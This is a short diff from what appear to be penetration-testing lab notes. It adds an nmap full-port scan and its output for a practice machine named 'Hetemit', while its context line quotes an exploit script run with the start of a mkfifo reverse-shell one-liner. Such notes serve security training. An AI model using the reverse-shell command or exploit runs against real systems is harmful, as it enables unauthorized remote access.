@@ -268,7 +268,12 @@ python3 50847.py -i 192.168.207.47 -p 5437 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/
 ```
 ### Hetemit
 ```shell
-
+# port scan
+sudo nmap -sC -sV -Pn -p- 192.168.207.117 -oN 207.117_allport
+18000/tcp open  biimenu?
+50000/tcp open  http        Werkzeug httpd 1.0.1 (Python 3.6.8)
+|_http-server-header: Werkzeug/1.0.1 Python/3.6.8
+|_http-title: Site doesn't have a title (text/html; charset=utf-8).
 
 
 ```
